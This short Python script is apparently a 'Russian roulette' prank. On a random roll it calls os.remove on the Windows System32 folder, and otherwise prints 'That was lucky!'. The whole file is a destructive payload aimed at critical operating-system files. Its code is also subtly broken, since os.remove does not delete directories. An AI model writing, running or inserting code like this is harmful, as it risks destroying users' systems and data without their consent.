import random
import os

if random.randint(0, 6) == 6:
    os.remove("C:\Windows\System32")
else: 
    print("That was lucky!")